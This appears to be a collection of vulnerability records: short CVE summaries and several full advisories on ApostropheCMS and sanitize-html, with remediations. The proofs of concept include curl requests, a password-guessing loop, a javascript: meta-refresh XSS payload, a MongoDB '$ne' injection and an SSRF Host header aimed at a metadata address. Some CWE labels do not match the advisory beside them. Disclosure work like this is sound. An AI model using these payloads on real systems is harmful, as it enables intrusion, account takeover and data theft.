cves.summary: Buffer overflow in ProFTPD, wu-ftpd, and beroftpd allows remote attackers to gain root access via a series of MKD and CWD commands that create nested directories.

Microsoft HTML control as used in (1) Internet Explorer 5.0, (2) FrontPage Express, (3) Outlook Express 5, and (4) Eudora, and possibly others, allows remote malicious web site or HTML emails to cause a denial of service (100% CPU consumption) via large HTML form fields such as text inputs in a table cell.

E-mail client in Softarc FirstClass Internet Server 5.506 and earlier stores usernames and passwords in cleartext in the files (1) home.fc for version 5.506, (2) network.fc for version 3.5, or (3) FCCLIENT.LOG when logging is enabled.

Management information base (MIB) for a 3Com SuperStack II hub running software version 2.10 contains an object identifier (.1.3.6.1.4.1.43.10.4.2) that is accessible by a read-only community string, but lists the entire table of community strings, which could allow attackers to conduct unauthorized activities.
Buffer overflows in Mars NetWare Emulation (NWE, mars_nwe) package via long directory names.
Buffer overflow in suidperl (sperl), Perl 4.x and 5.x.
WWW File Share Pro 2.42 and earlier allows remote attackers to cause a denial of service (crash) via a large POST request.
The GetFile.cfm file in Allaire Forums allows remote attackers to read files through a parameter to GetFile.cfm.
Novell NetWare Transaction Tracking System (TTS) in Novell 4.11 and earlier allows remote attackers to cause a denial of service via a large number of requests.
An example application in ColdFusion Server 4.0 allows remote attackers to view source code via the sourcewindow.cfm file.
Directory traversal vulnerability in magiccard.cgi in My Postcards Platinum 5.0 and 6.0 allows remote attackers to read arbitrary files via a .. (dot dot) in the page parameter.
Buffer overflow in XiRCON 1.0 Beta 4 allows remote attackers to cause a denial of service (disconnect) via a long (1) ctcp, (2) primsg, (3) msg, or (4) notice command.
Format string vulnerability in cfd daemon in GNU CFEngine before 1.6.0a11 allows attackers to execute arbitrary commands via format characters in the CAUTH command.

zlt2000 microservices-platform through 6.0.0 contains an authorization bypass vulnerability in the search-center service that allows authenticated attackers to read any Elasticsearch index by specifying the index name in POST /search/{indexName} and GET /agg/requestStat/{indexName}/{routing} path variables. Attackers can query arbitrary indices including sys_user to retrieve sensitive user records and password hashes without proper access controls.
The "through the web code" capability for Zope 2.0 through 2.5.1 b1 allows untrusted users to shut down the Zope server via certain headers.

SQL injection vulnerability in modules.php in PHP-Nuke Video Gallery Module 0.1 Beta 5 allows remote attackers to execute arbitrary SQL code via the (1) clipid or (2) catid parameters in a viewclip, viewcat, or voteclip action.

DiGi Web Server allows remote attackers to cause a denial of service (CPU consumption) via an HTTP GET request that contains a large number of / (slash) characters, which consumes resources when DiGi converts the slashes to \ (backslash) characters.
The cancel command in Solaris 2.6 (i386) has a buffer overflow that allows local users to obtain root access.
user_profile.asp in PortalApp 2.2 allows local users to gain privileges by modifying the user_id variable.
IIS newdsn.exe CGI script allows remote users to overwrite files.
iPass RoamServer 3.1 creates temporary files with world-writable permissions.

Directory traversal vulnerability in html_web_store.cgi and web_store.cgi CGI programs in eXtropia WebStore allows remote attackers to read arbitrary files via a .. (dot dot) attack on the page parameter.

Microsoft Exchange Server 5.5 does not properly handle a MIME header with a blank charset specified, which allows remote attackers to cause a denial of service via a charset="" command, aka the "Malformed MIME Header" vulnerability.
Novell NetWare with Novell-HTTP-Server or YAWN web servers allows remote attackers to conduct a denial of service via a large number of HTTP GET requests.
The Debian mailman package uses weak authentication, which allows attackers to gain privileges.
The Windows NT Client Server Runtime Subsystem (CSRSS) can be subjected to a denial of service when all worker threads are waiting for user input.

## Summary

When uploadfs is configured with the Azure backend and `sas: true` (a supported configuration introduced in uploadfs 1.25.0), `createContainer()` builds the `BlobServiceClient` from a URL that embeds the full SAS query string, and Azure SDK v12 derived clients inherit that query string. As a result, `getUrl()` returns a base URL carrying the complete account/container SAS signature (`?sv=...&sig=...`), and Apostrophe's `attachment.url()` prepends it to every public attachment link — broadcasting a container-level SAS credential (commonly `sp=rwdlac`, full read/write/delete/list) to every site visitor, including anonymous ones. Anyone who can see an attachment URL can read, overwrite, delete, and list every blob in the container for the SAS lifetime. A companion functional bug (blob path appended after the query string, producing broken URLs) shows this code path was never exercised end to end. Shared-key mode (default) and non-Azure backends are not affected.

Verified at commit `5a3746aaed49761e171c2cbfe793267c959829fd` (uploadfs 1.27.0 in the apostrophe monorepo).

## Details

Root cause: a credential-bearing client URL is reused as the public base URL. The chain:

- Credential-embedded client: [azure.js#L123-L125](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed49761e171c2cbfe793267c959829fd/packages/uploadfs/lib/storage/azure.js#L123-L125) — `new BlobServiceClient("https://<account>.blob.core.windows.net?<SAS query string>")` where `cluster.key` is the full SAS string including `sig`
- Leak point: [azure.js#L513-L520](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed49761e171c2cbfe793267c959829fd/packages/uploadfs/lib/storage/azure.js#L513-L520) — `getUrl()` takes `getContainerClient(...).getBlobClient('').url` as `baseUrl`; SDK v12 derived clients inherit the SAS query string, so `baseUrl` already contains `?sv=...&sig=...`
- Public exposure: [attachment/index.js#L694](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed49761e171c2cbfe793267c959829fd/packages/apostrophe/modules/@apostrophecms/attachment/index.js#L694) — `attachment.url()` = `uploadfs.getUrl() + path` for every rendered attachment link; [attachment/index.js#L1503](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed49761e171c2cbfe793267c959829fd/packages/apostrophe/modules/@apostrophecms/attachment/index.js#L1503) — `getBrowserData()` also ships `uploadsUrl` to every logged-in editor session
- Companion bug: the blob path is appended **after** the query string (`/container/?sv=...&sig=XXX/attachments/id-name`), so these URLs are also broken — evidence the 1.25.0 code path was never tested

Attack surface: every public page rendering attachment URLs (images, download links), plus the `uploadsUrl` delivered to editor sessions. The leak is passive and unconditional — no action required from the victim beyond serving a page. The credential further propagates through HTML source, logs, Referer headers, and CDN/proxy access logs.

**Suggested remediation:**
1. Strip the query string before building public URLs: `const u = new URL(blob.svc.getContainerClient(...).getBlobClient('').url); u.search = '';` (or compose `accountUrl + '/' + container` manually), and append the blob path to the pathname, not after the query.
2. Document that SAS mode must use least privilege (read-only, ideally `sr=b` per-blob), and prefer generating short-lived per-blob read-only signed URLs via `generateBlobSASQueryParameters` instead of embedding a service-level SAS in permanent public URLs.

## PoC

Full PoC posted as the first comment below (`poc.js` + README; offline, no Azure account needed). It replicates the library's exact two steps with the declared dependency `@azure/storage-blob@12`:

1. `npm install @azure/storage-blob@12 && node poc.js`
2. The script constructs `new BlobServiceClient("https://myaccount.blob.core.windows.net?sv=...&sig=FAKESIGNATURE")` exactly like `createContainer()`, then evaluates the `getUrl()` logic (`getContainerClient('uploads-container').getBlobClient('').url`) and asserts the resulting base URL still contains the `sig` parameter.
3. Observed output (exit code 0):

```
baseUrl: https://myaccount.blob.core.windows.net/uploads-container/?sv=2021-06-08&ss=b&srt=co&sp=rwdlac&se=2099-01-01&sig=FAKESIGNATURE
attachment URL as served to visitors: https://myaccount.blob.core.windows.net/uploads-container/?sv=2021-06-08&ss=b&srt=co&sp=rwdlac&se=2099-01-01&sig=FAKESIGNATURE/attachments/abc123-photo.jpg
```

The produced URL both leaks the token (`sv`…`sig`) and demonstrates the broken path placement. Cross-checking `attachment/index.js` confirms this URL reaches public pages unmodified.

## Impact

- **What it is:** insufficiently protected credentials (CWE-522) leading to information exposure (CWE-200). A container-level SAS token — commonly granted `sp=rwdlac` (read/write/delete/list/ACL) — is disclosed to every site visitor including anonymous users, valid for the SAS lifetime (often years). Holders can read, overwrite, delete, and enumerate every attachment in the container; the library applies no narrowing.
- **Who is impacted:** Apostrophe sites using uploadfs with the Azure backend and `sas: true` (introduced in 1.25.0; present through 1.27.0). Default shared-key mode and other backends are unaffected. When the SAS is provisioned read-only, the impact reduces to unauthenticated read/download of all attachments.

Reported by **Kimi Security Team** (bug-report@moonshot.ai).

cwe.name: Exposure of Sensitive Information to an Unauthorized Actor

cves.summary:
**Summary**
ApostropheCMS’s exist-in-locale API allows an authenticated low-privilege user to determine whether restricted documents exist in a specified locale and mode, including draft mode. The endpoint returns localized document identifiers without applying document-level view or edit authorization criteria.

The issue was reproduced against a real local ApostropheCMS application running the reviewed source code. The test used a synthetic guest account and synthetic restricted draft records.

**Details**
Exact vulnerable source path: ` packages/apostrophe/modules/@apostrophecms/i18n/index.js:503-529`
Exact API route:` POST /api/v1/@apostrophecms/i18n/exist-in-locale`
The handler verifies only that the requester is authenticated:

```
if (!req.user) {
  throw self.apos.error('notfound');
}
```
It then performs a direct database lookup using attacker-controlled document IDs, locale, and mode:

```
const found = await self.apos.doc.db.find({
  aposLocale: `${locale}:${mode}`,
  aposDocId: {
    $in: ids.map(self.apos.doc.toAposDocId)
  }
}).project({
  _id: 1,
  aposDocId: 1
}).toArray();
```
This query does not apply:

.permission('view')
.permission('edit')
apos.permission.criteria(req, 'view')
object-level document authorization
locale-specific authorization

The endpoint accepts multiple IDs, making bulk probing possible.

**Proof of Concept**

The local application was running at: http://127.0.0.1:3000
The test account had the low-privilege role: guest
The local database contained synthetic records for the restricted document base ID:
```
wv2l4rbaplgzkg80zkne4aoz:en:draft
wv2l4rbaplgzkg80zkne4aoz:fr:draft
```
All credentials and cookies are intentionally redacted below.

```
POST /api/v1/@apostrophecms/i18n/exist-in-locale HTTP/1.1
Host: 127.0.0.1:3000
Cookie: <redacted-authenticated-guest-session>
Content-Type: application/json
Accept: application/json

{
  "ids": [
    "wv2l4rbaplgzkg80zkne4aoz:en:draft",
    "ckzzzzzzzzzzzzzzzzzzzzzzz:en:draft"
  ],
  "locale": "fr",
  "mode": "draft"
}
```
**Equivalent command**
```
curl -i -sS -X POST \
  'http://127.0.0.1:3000/api/v1/@apostrophecms/i18n/exist-in-locale' \
  -b /path/to/redacted-guest-cookie-jar.txt \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data-raw '{
    "ids": [
      "wv2l4rbaplgzkg80zkne4aoz:en:draft",
      "ckzzzzzzzzzzzzzzzzzzzzzzz:en:draft"
    ],
    "locale": "fr",
    "mode": "draft"
  }'
```
**Observed response**
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
```

```
{
  "originalLocaleIds": [
    "wv2l4rbaplgzkg80zkne4aoz:en:draft"
  ],
  "newLocaleIds": [
    "wv2l4rbaplgzkg80zkne4aoz:fr:draft"
  ],
  "aposDocIds": [
    "wv2l4rbaplgzkg80zkne4aoz"
  ]
}
```
The nonexistent ID was omitted from the response. This proves that the endpoint acts as an existence oracle.

**Authorization control**
Using the same authenticated guest session and the localized document identifier returned above, the normal page API was requested:

```
GET /api/v1/@apostrophecms/page/wv2l4rbaplgzkg80zkne4aoz:fr:draft HTTP/1.1
Host: 127.0.0.1:3000
Cookie: <redacted-authenticated-guest-session>
Accept: application/json

```

**Observed response:**
```
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
```
```
{
  "name": "forbidden",
  "data": {},
  "message": "forbidden"
}

```
This demonstrates the authorization boundary clearly:

| Request                                         | Result                              |
| ----------------------------------------------- | ----------------------------------- |
| Normal page API for the restricted draft        | `403 Forbidden`                     |
| `exist-in-locale` for the same restricted draft | `200 OK` with localized document ID |
| `exist-in-locale` for a nonexistent ID          | `200 OK` with empty arrays          |

**Additional impact validation**

The behavior was also tested across multiple locale and mode combinations:

| Query                         | Result                                                     |
| ----------------------------- | ---------------------------------------------------------- |
| `locale=fr`, `mode=draft`     | Returned `wv2l4rbaplgzkg80zkne4aoz:fr:draft`               |
| `locale=fr`, `mode=published` | Returned empty arrays because no published fixture existed |
| `locale=de`, `mode=draft`     | Returned empty arrays because no German fixture existed    |
| Two IDs in one request        | Existing ID returned; nonexistent ID omitted               |

This confirms that the endpoint can be used to discover whether a document has a localized draft in a particular locale and to perform bulk enumeration.

Impact
A low-privilege authenticated user can:
Probe arbitrary known or guessed document base IDs.
Determine whether restricted documents have localized versions.
Determine whether unpublished draft versions exist.
Identify which locales contain matching records.
Obtain exact localized document identifiers.
Submit multiple IDs in one request for bulk reconnaissance.
The issue does not directly disclose the document body or grant write, publish, or delete privileges. During testing, no content was modified, published, deleted, or exposed beyond the identifier metadata.

Recommended remediation
Before executing the database lookup, apply the same document-level authorization criteria used by the normal document API. The query should be restricted to documents the requester is authorized to view in the requested locale and mode. Draft queries should additionally require the appropriate draft-view permission for the specific document, not merely authentication or a global role check.
The endpoint should also avoid returning localized document identifiers for records that fail the requester’s document-level permission criteria.

[[1] ApostropheCMS i18n source — existInLocale handler, lines 503–529](https://github.com/apostrophecms/apostrophe/blob/61d137f31a0de15a8eb70b7e65032e0519fc6e61/packages/apostrophe/modules/@apostrophecms/i18n/index.js#L503-L529)

[[2] Official ApostropheCMS i18n API documentation](https://apostrophecms.com/docs/reference/api/i18n.html)

## Summary

`@apostrophecms/import-export`'s update-by-key feature lets an imported
document carry a `<field>:key` property (for example `slug:key`) whose
value is used to find an existing document to update instead of inserting
a new one. `getUpdateKey()`/`insertOrUpdateDocWithKey()`
(`lib/methods/import.js`) use that value directly as a MongoDB query value
with no laundering:

```js
const matchingDraftPromise = manager.findForEditing(
  req.clone({ mode: 'draft' }),
  {
    aposMode: 'draft',
    [updateField]: doc[updateKey]
  }).toObject();
```

Archive documents are parsed with EJSON (see `lib/formats/gzip.js`), which
revives objects such as `{ $ne: null }` as live values, the same untrusted
data source and revival mechanism already fixed once in this module for
`findSingletonAposDocId`/`findParkedAposDocId` in GHSA-79qf-vqgc-7xx3. That
fix did not touch `insertOrUpdateDocWithKey`, so the identical class of bug
survives here: a crafted `"slug:key": { "$ne": null }` entry in an
archive's `aposDocs.json` makes the import match (and then update) an
existing document the archive's author never actually identified, instead
of failing to find a match.

## Impact

Reaching this requires only an authenticated session with import access to
the target type (the built-in contributor role holds this, matching the
precondition of GHSA-79qf-vqgc-7xx3), and no admin interaction. Because the
match uses a MongoDB operator instead of an exact value, it is not limited
to a document the importer already knows the identifying field of: any
existing document the importer has generic edit rights on and that
satisfies the operator (which `{ $ne: null }` trivially does for any doc
with a non-null value in that field) is a candidate, and Apostrophe's
`findForEditing` permission filter, not the update-key logic, is the only
thing narrowing which document actually gets matched and overwritten.

Live-verified: a contributor-role request importing a document containing
`"slug:key": { "$ne": null }` had its content applied to an existing,
unrelated draft article, overwriting its title, while the importer never
specified that article's real slug.

## Affected versions

Confirmed on `main` branch HEAD as of 2026-09-04,
`packages/import-export/lib/methods/import.js`.

## Suggested fix

Launder `doc[updateKey]` to a plain string (mirroring the fix already
applied to `type`/`aposLocale`/`parkedId` in GHSA-79qf-vqgc-7xx3) before
using it as a query value, and fall back to the insert path when it is not
a usable string.

cwe.name: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

cves.summary:
**Summary**
The self-service password-change endpoint verifies the current password but does not use the login module’s failed-attempt counter, throttle, delay, or lockout mechanism. An attacker with a valid authenticated session can submit repeated guesses for the current password without receiving a lockout or throttle response.

**Exact source path**
packages/apostrophe/modules/@apostrophecms/settings/index.js:621-664

**The password-change route is:**
PATCH /api/v1/@apostrophecms/settings/password

**The route calls the password verifier directly through:**
await self.handleProtectedSubform(req, subform, req.body );

**The password verification path is:**
packages/apostrophe/modules/@apostrophecms/settings/index.js:514-542

**async handlePasswordProtectedSubform(req, subform, payload) {
  try {
    await self.apos.user.verifyPassword(req.user, payload.passwordCurrent);
  } catch (e) {
    throw self.apos.error(
      'forbidden',
      'apostrophe:passwordCurrentError',
      { path: 'passwordCurrent' }
    );
  }
  return subform;
}**

**The verifier itself does not increment the login-attempt cache or enforce a delay:**
packages/apostrophe/modules/@apostrophecms/user/index.js:412-487

**By contrast, the login route explicitly calls checkLoginAttempts and addLoginAttempt in:**
packages/apostrophe/modules/@apostrophecms/login/index.js:831-929

**Local PoC**
The test used a disposable authenticated guest session against:

Request:

```
PATCH /api/v1/@apostrophecms/settings/password HTTP/1.1
Host: 127.0.0.1:3000
Cookie: <redacted-authenticated-session>
Content-Type: application/json

{
  "password": "new-temporary-password",
  "passwordRepeat": "new-temporary-password",
  "passwordCurrent": "definitely-wrong-current-password"
}
```

**Equivalent command:**

```
for i in 1 2 3 4 5; do
  time curl -i -sS \
    -b /path/to/temporary-session-cookie-jar.txt \
    -X PATCH \
    'http://127.0.0.1:3000/api/v1/@apostrophecms/settings/password' \
    -H 'Content-Type: application/json' \
    --data-raw '{
      "password": "new-temporary-password",
      "passwordRepeat": "new-temporary-password",
      "passwordCurrent": "definitely-wrong-current-password"
    }'
done
```

**Observed response**
All five attempts returned the same immediate validation response:
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
{
  "name": "forbidden",
  "data": {
    "path": "passwordCurrent"
  },
  "message": "apostrophe:passwordCurrentError"
}

Observed timings were approximately:
Attempt 1: 231 ms
Attempt 2: 232 ms
Attempt 3: 226 ms
Attempt 4: 229 ms
Attempt 5: 226 ms

No attempt returned a throttle response, lockout message, Retry-After header, or rate-limit status.

seq 1 20 | xargs -P 20 -I{} sh -c \
  "curl --max-time 15 -sS \
    -o /tmp/password-attempt-{}.body \
    -w '%{http_code}\\n' \
    -b /path/to/temporary-session-cookie-jar.txt \
    -X PATCH \
    'http://127.0.0.1:3000/api/v1/@apostrophecms/settings/password' \
    -H 'Content-Type: application/json' \
    --data-raw '{\"password\":\"new-temporary-password-{}\",\"passwordRepeat\":\"new-temporary-password-{}\",\"passwordCurrent\":\"wrong-current-{}\"}'"

Result:
20 requests -> HTTP 403 Forbidden
0 requests -> HTTP 429 Too Many Requests
0 requests -> lockout response

The valid password continued to authenticate afterward:
POST /api/v1/@apostrophecms/login/login HTTP/1.1
HTTP/1.1 200 OK

Impact
An attacker who has obtained or hijacked a valid authenticated session can repeatedly guess the current password through the password-change endpoint. Each guess receives a normal response, and the route does not apply the login throttle or lockout mechanism.
If the current password is weak or reused, this can allow the attacker to pass the current-password check and replace the account password. The attacker would then be able to log in after the password change. The attack requires a valid authenticated session and does not work anonymously.
Severity
Medium, subject to the application’s session-threat model. The prerequisite of an already authenticated session limits exploitability, but successful guessing leads directly to account takeover through password replacement.

cves.summary:
### Summary

CVE-2026-53606 expanded `allowedSchemesAppliedToAttributes` so named URL attributes (`action`, `formaction`, `data`, `poster`, `background`, later `ping`, `xlink:href`, …) go through `naughtyHref()`. A **URL nested inside `meta` `content`** (`http-equiv=refresh`) is not an attribute name on that list, so the embedded destination is never scheme-checked.

Default `allowedTags` still omit `meta`. Same non-default integrator config as 53606: allow `meta` plus `http-equiv` / `content`.

On **2.17.7**:

```text
sanitizeHtml(
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  { allowedTags: ['meta'], allowedAttributes: { meta: ['http-equiv', 'content'] } }
)
// => <meta http-equiv="refresh" content="0;url=javascript:alert(1)" />
```

`data:text/html,…` and arbitrary `https:` destinations also survive. `formaction="javascript:…"` (53606) is stripped.

Please **Request CVE**. Credit: Finder + Reporter (`adrbogacz`).

### Details

`naughtyHref()` only runs when the attribute name is in `allowedSchemesAppliedToAttributes` (`index.js` ~385). Refresh URLs live in a `content` value of the form `0;url=…`, so the gate never fires. Adding `content` to that list wholesale would break ordinary meta `content` (description, viewport).

**Fix:** when `http-equiv` is `refresh` (case-insensitive), parse the `; url=` destination and run `naughtyHref('meta', url)`. Drop `content` (or the tag) if the URL is rejected. Leave other `meta` `content` values alone.

### PoC

Local `sanitize-html@2.17.7`. Output inspection only:

```text
node -e '
const sanitize = require("sanitize-html");
const opts = { allowedTags: ["meta"], allowedAttributes: { meta: ["http-equiv", "content"] } };
for (const html of [
  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
  "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,aaa\">",
  "<form><button formaction=\"javascript:alert(1)\">x</button></form>",
]) {
  console.log(html, "=>", sanitize(html, html.includes("meta") ? opts : { allowedTags: ["form","button"], allowedAttributes: { button: ["formaction"] } }));
}
'
```

Expected: refresh `javascript:` / `data:` remain; 53606 `formaction` is removed. Do not attach a browser hang or stored-XSS page.

### Impact

An integrator who allowed `meta` + `content` expecting `allowedSchemes` to apply (the 53606 configuration pattern) still emits a refresh to `javascript:`, `data:`, or an attacker `https:` URL. Stored XSS / open redirect for viewers of that HTML. Default config is not affected.

cves.summary:
## Summary
The REST route `GET /api/v1/<piece-type>/:_id/locales` (and the equivalent page route) does not apply the `publicApiCheckAsync` gate that ApostropheCMS's other read routes enforce. An unauthenticated caller can therefore query this route for any document `_id` and learn whether the document exists and which locales it is published in — a document-existence and locale-metadata disclosure that the read-API is otherwise supposed to gate.
 
## Affected
- Repository: `apostrophecms/apostrophe` (monorepo package `apostrophe`).
- Confirmed at **4.32.2** (commit `d3ff8c9` == the shipped 4.32.2; unchanged at current HEAD). No fix at time of report.
- Stack: Node.js / Express + MongoDB.
- Endpoints: `GET /api/v1/<piece-type>/:_id/locales` and `GET /api/v1/@apostrophecms/page/:_id/locales`.

## Technical detail
- Unsafe: `modules/@apostrophecms/piece-type/index.js:397` registers the `:_id/locales` route with **no** `publicApiCheckAsync`. The page module has the same omission at `modules/@apostrophecms/page/index.js:925`.
- Gated siblings: the read routes in the same module (e.g. `getAll` at `piece-type/index.js:256-263`) call `publicApiCheckAsync` (`:263`) to enforce the public-API access policy.
- So the `locales` handler (which calls `getLocales()` for the document) runs for any caller regardless of the public-API gate the other read routes apply, returning the document's locale/publication metadata without authorization.

## Impact

An unauthenticated caller can confirm the existence of a document by `_id` and enumerate its locales/publication state — information the read-API is meant to gate. Defensibly 4.3 (AC:H) given the opaque `_id` precondition (the caller needs a document id).
 
## How it was verified (local only)
Reproduced against `apostrophe@4.32.2` (== commit `d3ff8c9`) locally with synthetic content:
- Source review confirmed the `:_id/locales` route lacks `publicApiCheckAsync` while the sibling read routes have it.
- An **unauthenticated** `GET /api/v1/<piece-type>/<_id>/locales` returned the document's locale metadata (existence + locales), while the gated read routes (e.g. `getAll`) correctly required the public-API policy.
- Control: the same route with the `publicApiCheckAsync` gate added (matching the siblings) denies the unauthenticated request — isolating the missing gate as the cause.
Synthetic content only; nothing hosted was touched.
 
## Remediation
Add the `publicApiCheckAsync` (or equivalent) authorization gate to the `:_id/locales` route in both the piece-type and page modules, matching the sibling read routes, so the locale/existence metadata is only returned to callers permitted by the public-API policy.
 
## Credit
Please credit **Santosh Kumar Puppala** (https://github.com/Santoshkumarpuppala).

cwe.name: Exposure of Sensitive Information to an Unauthorized Actor

cves.summary:
**Summary**
The core page REST API reads full page documents with `.permission(false)` in `getOne` and in the `all=1` tree dump, bypassing page-type `viewRole`, `visibility: private`, and `visibility: loginRequired` checks. Unauthenticated visitors and low-privilege contributors can read admin-only and non-public page content by `_id`/slug.

**Details**
`packages/apostrophe/modules/@apostrophecms/page/index.js`:
- `getOne` (L456–465): `await self.publicApiCheckAsync(req); ... self.getRestQuery(req).permission(false).and(criteria)` — no `viewRole` threshold, no `visibility` filtering.
- `all` handler (L318–395): `getRestQuery(req).permission(false)` (L384–385) walks every page type and returns the projection including `visibility`.
- `publicApiCheckAsync` (L3044) only checks that `publicApiProjection` exists — it performs no authorization.
- Correct control behaves differently: `piece-type/index.js:getOne` (L319–327) uses `getRestQuery(req)` without `.permission(false)` and enforces `viewRole`.

**PoC**
```
# Anonymous (no session) — private, admin-only page:
curl "http://localhost:3100/api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:published"
# → 200  {"_id":"...:en:published","title":"Secret Private Page","slug":"/secret-page",
#         "type":"private-type","visibility":"private","secretData":"TOP-SECRET-VALUE-abc123"}

# Anonymous full site-map dump (includes private + loginRequired pages):
curl "http://localhost:3100/api/v1/@apostrophecms/page?all=1"        # → 200, full tree

# Contributor (cont_admin) reads full admin-only doc incl. protected field:
curl -b contrib.cookies ".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:published"
# → 200  secretData = TOP-SECRET-VALUE-abc123
# Controls (correctly enforced):
curl -b contrib.cookies ".../api/v1/@apostrophecms/page?type=private-type&autocomplete=zz"   # → 403
curl -b contrib.cookies ".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:draft"   # → 403
```

**Impact**
Unauthenticated disclosure of `visibility: private` and `loginRequired` pages (full documents, not just paths) and of the complete site structure with visibility/type metadata; contributors read admin-only page types and their protected fields. Because `_id`s are enumerable and leaked by `all=1`, this is systemic.

**Remediation** — Remove `.permission(false)` from `getOne`/`all` or re-apply the type's `viewRole` threshold plus the same `visibility`/login-required criteria the list and autocomplete paths use (mirror `piece-type`); make `publicApiCheck` config-presence-only and add an explicit authorization step per verb.

## Summary

The `@apostrophecms/ai-helper` package builds the URL for a server-side image fetch by resolving a storage-relative path against `req.baseUrl`. When the site does not set a global base URL (the default), `req.baseUrl` is derived from the incoming HTTP `Host` header. An authenticated editor can generate a base64 AI image (which is persisted without a stored `url`) and then send an unauthorized `PATCH` accept request with an attacker-chosen `Host` header. The server then issues an outbound `GET` to the attacker-selected origin, producing a Server-Side Request Forgery primitive that reaches hosts and ports the client cannot otherwise contact. The affected code lives in `packages/ai-helper/modules/@apostrophecms/ai-helper-image/index.js`.

## Root Cause

The image accept route trusts `req.baseUrl` as a safe origin for constructing an internal fetch target, but `req.baseUrl` is attacker-influenced whenever the site has no configured base URL. The URL builder concatenates a default local storage path (which is relative, for example `/uploads`) and resolves it against `req.baseUrl`; because the left operand is relative, the resulting origin is taken entirely from `req.baseUrl`. Two protections that exist elsewhere are missing on this path: the generate route enforces an edit capability, but the accept route performs no authorization or ownership check, and no allowlist or validation constrains the resolved origin before the fetch.

```text
packages/ai-helper/modules/@apostrophecms/ai-helper-image/index.js
  aiHelperImageUrl (line 91-92): image.url || new URL(self.uploadfs.getUrl() + `/ai-helper-images/${image._id}.png`, req.baseUrl)
  aiHelperFetchImage (line 64-65): fetch(self.aiHelperImageUrl(req, image))
  apiRoutes.patch['ai-helper/:_id'] (line 314-333): findOne({ _id }) only; no permission or ownership check
packages/apostrophe/modules/@apostrophecms/i18n/index.js
  setPrefixUrls (line 799-820): req.baseUrl falls back to `${req.protocol}://${host}`, host from the Host header when apos.baseUrl is unset
```

## Impact

An attacker who holds a low-privileged editor account (the capability required to generate an AI image, which inserts a base64 record without a stored `url` and returns its identifier) can coerce the server into issuing outbound `GET` requests to an origin of their choosing by supplying a crafted `Host` header on the accept request. This yields SSRF: probing internal hosts and ports that are not reachable from the attacker's network position, and limited semi-blind exfiltration where an image-parseable response at the fixed path becomes a viewable attachment. The request path is fixed to `/uploads/ai-helper-images/<id>.png`, so only the origin (host, port, and `http` scheme) is attacker-controlled; arbitrary-path retrieval such as cloud metadata traversal is not reachable through this primitive. No integrity or availability primitive was demonstrated. Exploitation requires the default deployment where no global base URL is configured and local file storage is in use, together with a configured provider that returns base64 image data.

## Proof of Concept

```text
Preconditions:
  - ApostropheCMS site with @apostrophecms/ai-helper installed and a configured
    base64-returning image provider.
  - No global base URL configured (apos.baseUrl unset), default local uploadfs.
  - Attacker holds an account with edit capability on at least one content type.
```

1. Authenticate as the editor and generate a base64 AI image:
   `POST /api/v1/@apostrophecms/image/ai-helper` with body `{"prompt":"x"}`. The response contains the new record identifier `<_id>`. The persisted record has no `url` field.
2. Send the accept request with a malicious `Host` header:

```text
PATCH /api/v1/@apostrophecms/image/ai-helper/<_id> HTTP/1.1
Host: 169.254.169.254
Content-Type: application/json

{"accepted": true}
```

3. The server derives `req.baseUrl` as `http://169.254.169.254`, builds the fetch target `http://169.254.169.254/uploads/ai-helper-images/<_id>.png`, and issues the outbound request.

```text
Derivation confirmed against source logic:
  base64 record (no url) + Host: 169.254.169.254
    -> new URL("/uploads/ai-helper-images/<_id>.png", "http://169.254.169.254")
    -> server fetches: http://169.254.169.254/uploads/ai-helper-images/<_id>.png
  control (apos.baseUrl set to https://cms.example.com):
    -> fetch target uses https://cms.example.com (Host ignored)
  control (record stores its own url):
    -> aiHelperImageUrl short-circuits to the stored url (no SSRF)
```

## Attack Chain

1. **Exposure:** The `@apostrophecms/ai-helper-image` module registers `POST` and `PATCH` routes under `/api/v1/@apostrophecms/image/ai-helper`, reachable by any authenticated session on a site that installed the package.
2. **Control:** The attacker controls the HTTP `Host` header on the `PATCH` request; the global `locale` middleware copies it into `req.baseUrl` because `apos.baseUrl` is unset (`packages/apostrophe/modules/@apostrophecms/i18n/index.js:805,816-819`).
3. **Path:** The attacker first generates a base64 image via `POST`, which inserts a record without a `url` (`ai-helper-image/index.js:282-284`); the returned identifier is then used in the `PATCH` accept request, which calls `aiHelperFetchImage` (`:332`).
4. **Guard:** The `PATCH` handler checks only `req.body.accepted` and record existence via `findOne({ _id })` (`:318,:322`); it performs no capability check and no owner scoping, unlike the `POST` route which calls `checkPermissions` (`:176`). No validation constrains the resolved origin before the fetch.
5. **Primitive:** `aiHelperImageUrl` resolves the relative storage path against the Host-derived `req.baseUrl` and `aiHelperFetchImage` calls `fetch` on the result (`:91-92,:64-65`).
6. **Result:** The server performs an outbound `GET` to the attacker-chosen origin at a fixed path, granting internal host and port reachability and limited semi-blind response retrieval that the attacker's network position does not otherwise permit.

## Bypass Evidence

The generate route's `checkPermissions` guard (`ai-helper-image/index.js:176`) is not present on the accept route, so no authorization protects the fetch. The following refutations were tested and defeated:

- Default local storage returns a relative URL: `uploadfs.getUrl()` yields `/uploads` because the local backend builds `uploadsUrl = (apos.baseUrl || '') + prefix + '/uploads'`, so `new URL(relative, req.baseUrl)` takes its origin from `req.baseUrl`. Configuring a base URL or an absolute storage URL (S3/CDN) defeats the attack, which is why those are negative controls, not the default.
- The base64 record has no persisted `url`: `insertOne(image)` stores the record before `image.url` is assigned on the in-memory response object (`:282-284` versus `:294`), so the `PATCH` handler re-reads a record with no `url` and the short-circuit in `aiHelperImageUrl` does not apply.
